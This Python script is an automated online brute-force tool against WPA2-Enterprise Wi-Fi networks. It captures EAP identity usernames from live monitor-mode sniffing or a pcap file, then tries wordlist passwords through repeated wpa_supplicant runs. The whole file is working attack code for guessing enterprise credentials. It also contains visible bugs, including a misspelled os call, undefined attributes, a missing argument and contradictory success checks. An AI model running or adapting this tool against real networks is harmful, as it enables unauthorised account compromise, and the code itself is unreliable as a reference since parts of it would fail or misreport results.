#!/usr/bin/python3

import argparse
import config
from lib import conf_manager
#from multiprocessing import Process, Queue
import queue

parser = argparse.ArgumentParser(description='Automated online WPA2-Enterprise Brute Forcing Tool')

parser.add_argument('--version', action='version', version=config.__version__)
parser.add_argument('-b', '--bssid', dest='bssid', default=config.default_bssid, help='select target bssid (Default: {})'.format(config.default_bssid))
parser.add_argument('-D', '--debug', dest='debug', default=False, action='store_true', help='enable debug mode')

sourceOptions = parser.add_argument_group(description='Specify target source for extraction')
sourceOptions.add_argument('-f', '--filename', dest='filename', help='extract eap.identity from pcap')
sourceOptions.add_argument('-m', '--monitor', dest='monitor_interface', help='set interface to monitor for eap.identity on')

liveExtractionOptions = parser.add_argument_group(description='Control settings for live extraction')
liveExtractionOptions.add_argument('-l', '--live', dest='live_capture_window', type=int, default=config.default_live_capture_window, help='specify the timeout for live capture window (Default: {})'.format(config.default_live_capture_window))
liveExtractionOptions.add_argument('-c', '--channel', dest='channel', type=int, help='specify channel monitor')

bruteforceOptions = parser.add_argument_group(description='Control settings for brute force attacks')
bruteforceOptions.add_argument('-t', '--timeout', dest='timeout', type=int, default=config.default_timeout, help='specify the timeout delay for password guessing (Default: {})'.format(config.default_timeout))
bruteforceOptions.add_argument('-e', '--eap', choices=config.supported_eap_methods, dest='eap_method', default=config.default_eap_methods, help='Control EAP method to use (Default: {})'.format(config.default_eap_methods))
bruteforceOptions.add_argument('-s', '--ssid', dest='ssid', help='specify ssid')
bruteforceOptions.add_argument('-i', '--interface', dest='interface', help='set interface to use')
bruteforceOptions.add_argument('-p', '--passfile', dest='pass_file', help='specify wordlist')
bruteforceOptions.add_argument('--wpa-supplicant-file', default=config.wpa_supplicant_conf_location, dest='wpa_supplicant_file', help='Set a custom location for the wpa_supplicant file')

args, leftover = parser.parse_known_args()
options = args.__dict__

class identityAttackUtils():

    @staticmethod
    def setInterfaceModeMonitor(interface):
        import os

        os.system('iwconfig {} mode monitor'.format(interface))

    @staticmethod
    def setInterfaceModeManaged(interface):
        import os

        os.system('iwconfig {} mode managed'.format(interface))

    @staticmethod
    def setInterfaceDown(interface):
        import os

        os.system('ifconfig {} down'.format(interface))

    @staticmethod
    def setInterfaceUp(interface):
        import os

        os.system('ifconfig {} up'.format(interface))

    @staticmethod
    def setInterfaceChannel(interface, channel):
        import os

        os.system('iwconfig {} channel {}'.format(interface, channel))

    @staticmethod
    def setInterfaceNmUnmanaged(interface):
        import os

        os.system('nmcli device set {} managed no'.format(interface))

    @staticmethod
    def setInterfaceNmManaged(interface):
        import os

        os.system('nmcli device set {} managed yes'.format(interface))

def identityBrute(identityArray, interface, ssid, passwordFile, wpa_supplicant_file):
    import subprocess, os, signal, datetime, time

    passwords = []
    f = open(passwordFile, 'r')
    lines = f.readlines()
    for line in lines:
        passwords.append(line.strip('\n'))

    print('[+] Creating wpa_supplicant.conf file: {}'.format(wpa_supplicant_file))
    for password in passwords:
        for ia in identityArray:
            conf_manager.wpa_supplicant_conf.configure(
                ssid=ssid,
                eap=options['eap_method'],
                identity=ia,
                password=password
            )
            command = [
                'wpa_supplicant',
                '-i{}'.format(interface),
                '-c{}'.format(wpa_supplicant_file)
            ]
            print('[+] Trying username "{}" with password "{}"'.format(ia, password))
            start = datetime.datetime.now()
            ps = subprocess.Popen(command,
                shell=False,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            while(ps.poll() is None):
                time.sleep(0.1)
                now = datetime.datetime.now()
                if((now-start).seconds > options['timeout']):
                    os.kill(ps.pid, signal.SIGKILL)
                    os.waitpid(-1, os.WNOHANG)
            if('EAP-MSCHAPV2: Invalid authenticator response in success request' in ps.stdout.read().decode('utf-8')):
                print('[+] credentials failed!')
            else:
                # included debug purposes
                if(options['debug']):
                    print(ps.stdout.read())

    return 0

def readProcess(packets):
    extractedIdentity = []
    for packet in packets:
        if(packet.haslayer(EAP) and (packet.addr3 == options['bssid'])):
            if((packet[Dot11][EAP].code == 2) and (packet[Dot11][EAP].type == 1)):
                extractedIdentity.append(packet[Dot11][EAP][Raw].load.decode('utf-8'))

    return 0, extractedIdentity

class identityATTACK():

    @classmethod
    def __init__(self, ssid=None, interface=None, passwordFile=None, live_capture_window=None, wpa_supplicant_file=None):
        self.testedIdentity = []
        self.currentlyTestingIdentity = ''
        self.extractedIdentityQueue = queue.Queue()
        self.testedIdentity = queue.Queue()
        self.interface=interface,
        self.passwordFile=passwordFile
        self.live_capture_window=live_capture_window
        self.capture_still_active = True
        self.passwords = []
        self.wpa_supplicant_file = wpa_supplicant_file

        f = open(self.passwordFile, 'r')
        lines = f.readlines()
        for line in lines:
            self.passwords.append(line.strip('\n'))
        f.close()

    @classmethod
    def setCaptureStillActive(self, toggle):
        self.capture_still_active = toggle

    @classmethod
    def getCaptureStillActiveStatus(self):
        return self.capture_still_active

    @classmethod
    def processorCapturedPackets(self, packet):
        if(packet.haslayer(EAP) and (packet.addr3 == options['bssid'])):
            if((packet[Dot11][EAP].code == 2) and (packet[Dot11][EAP].type == 1)):
                identity = packet[Dot11][EAP][Raw].load.decode('utf-8')
                if((not identity in self.extractedIdentityQueue.queue + self.testedIdentity.queue) and (identity != self.currentlyTestingIdentity)):
                    identityATTACK.queueWriter(identity=identity)
                else:
                    print('[+] Already found "{}", skipping...'.format(identity))

    @classmethod
    def queueReader(self):
        import time
        import datetime
        import os, signal

        target = ''
        while True:
            if(self.capture_still_active is True):
                success = False
                for identity in list(self.extractedIdentityQueue.queue):
                    target = identity
                    self.currentlyTestingIdentity = target
                    self.extractedIdentityQueue.get(identity)
                    for password in self.passwords:
                        conf_manager.wpa_supplicant_conf.configure(
                            ssid=options['ssid'],
                            eap=options['eap_method'],
                            identity=identity,
                            password=password
                        )
                        if(options['debug']):
                            print('[+] Checking if wpa_supplicant interface file exists: /var/run/wpa_supplicant/{}'.format(options['interface']))
                        if(os.path.isfile('/var/run/wpa_supplicant/{}'.format(options['interface']))):
                            if(options['debug']):
                                print('[+] Deleting wpa_supplicant interface file')
                            os.sytem('rm {}'.format('/var/run/wpa_supplicant/{}'.format(options['interface'])))
                        try:
                            print('[+] Trying username "{}" with password "{}"'.format(identity, password))
                            start = datetime.datetime.now()
                            command = [
                                'wpa_supplicant',
                                '-i{}'.format(options['interface']),
                                '-c{}'.format(self.wpa_supplicant_conf_location)
                            ]
                            ps = subprocess.Popen(
                                command,
                                shell=False,
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE
                            )
                            while(ps.poll() is None):
                                time.sleep(0.1)
                                now = datetime.datetime.now()
                                if((now-start).seconds > options['timeout']):
                                    os.kill(ps.pid, signal.SIGKILL)
                                    os.waitpid(-1, os.WNOHANG)
                            stdout_string = ps.stdout.read().decode('utf-8')
                            if(stdout_string.find('EAP-MSCHAPV2: Invalid authenticator response in success request') == -1):
                                print('[+] credentials failed!')
                            else:
                                # included debug purposes
                                if(options['debug']):
                                    print(stdout_string)
                                print('[+] credentials found!')
                                break
                        except Exception as e:
                            print('[!] Error: {}'.format(e))
                    print('[+] Adding "{}" to tested list'.format(target))
                    self.testedIdentity.put(target)
            if((self.capture_still_active is False) and (self.extractedIdentityQueue.empty())):
                print('[+] During the capture, the following accounts were identified and tested:')
                for t in self.testedIdentity.queue:
                    print('[-]    {}'.format(t))
                return 0
            else:
                time.sleep(self.live_capture_window % 5)

    @classmethod
    def queueWriter(self, identity):
        print('[+] Added new identity to brute force pool: {}'.format(identity))
        self.extractedIdentityQueue.put(identity)

if __name__ == '__main__':
    from kamene.config import conf
    conf.ipv6_enabled = False
    from kamene.all import *

    if((options['filename'] is not None) and (options['monitor_interface'] is None)):
        print('[+] Extracting EAP identity from pcap file: {}'.format(options['filename']))
        packets = rdpcap(options['filename'])
        resCode, extractedIdentity = readProcess(packets=packets)
        if(resCode != 1):
            print('[+] successfully extracted the following EAP identity:')
            for EI in extractedIdentity:
                print('[-]  {}'.format(EI))
            print('[-]')
            identityBrute(
                identityArray=extractedIdentity,
                ssid=options['ssid'],
                interface=options['interface'],
                passwordFile=options['pass_file'],
            )
    elif((options['monitor_interface'] is not None) and (options['filename'] is None)):
        try:
            print('[+] Configuring monitor adapter: {}'.format(options['monitor_interface']))
            identityAttackUtils.setInterfaceNmUnmanaged(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceDown(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceModeMonitor(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceUp(interface=options['monitor_interface'])
    
            i = identityATTACK(
                    ssid=options['ssid'],
                    interface=options['interface'],
                    passwordFile=options['pass_file'],
                    live_capture_window=options['live_capture_window'],
                    wpa_supplicant_file=options['wpa_supplicant_file']
                )

            import threading
            p = threading.Thread(target=i.queueReader)
            p.start()

            print('[+] Monitoring for eap.identity frames on interface "{}" for: {}s'.format(options['monitor_interface'], options['live_capture_window']))
            result = sniff(iface=options['monitor_interface'], prn=i.processorCapturedPackets, timeout=options['live_capture_window'], store=0)
            i.setCaptureStillActive(toggle=False)

            print('[+] Monitoring capture window has finished, waiting for brute force attacks to complete')
            p.join()

            print('[+] Resetting adapter: {}'.format(options['monitor_interface']))
            identityAttackUtils.setInterfaceDown(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceModeManaged(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceUp(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceChannel(interface=options['monitor_interface'], channel=options['channel'])
            identityAttackUtils.setInterfaceNmManaged(interface=options['monitor_interface'])
        except KeyboardInterrupt:
            print('[+] Resetting adapter: {}'.format(options['monitor_interface']))
            identityAttackUtils.setInterfaceDown(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceModeManaged(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceUp(interface=options['monitor_interface'])
            identityAttackUtils.setInterfaceNmManaged(interface=options['monitor_interface'])
    else:
        print('[!] Choose only 1 source location! (only --filename or --monitor')
        exit(1)
    exit(0)
